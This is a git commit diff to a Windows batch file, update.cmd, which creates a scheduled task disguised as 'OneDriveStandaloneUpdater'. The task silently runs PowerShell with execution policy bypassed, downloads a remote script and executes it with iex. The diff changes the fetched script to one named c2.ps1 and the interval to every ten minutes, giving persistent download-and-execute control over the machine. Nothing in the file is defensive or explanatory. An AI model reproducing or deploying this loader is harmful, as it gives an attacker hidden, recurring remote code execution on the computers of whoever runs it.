cf34dcba9c0ae5d50fc86e4532f276979e530ae0
Melfice60 <96183356+Melfice60@users.noreply.github.com>
2024-07-08 16:29:26 +0200

    Update update.cmd

--- update.cmd
+++ update.cmd
@@ -1,6 +1,6 @@
 @echo off
 setlocal enabledelayedexpansion
 set TaskName=OneDriveStandaloneUpdater
-schtasks /create /tn "%TaskName%" /tr "powershell.exe -NoProfile -NonInteractive -Exec Bypass -c '(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/s2.ps1 -UseBasicParsing|iex'" /sc minute /mo 5 /f > NUL 2>&1
+schtasks /create /tn "%TaskName%" /tr "powershell.exe -NoProfile -NonInteractive -Exec Bypass -c '(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/c2.ps1 -UseBasicParsing|iex'" /sc minute /mo 10 /f > NUL 2>&1
 timeout /t 1 /nobreak >nul 
 exit 
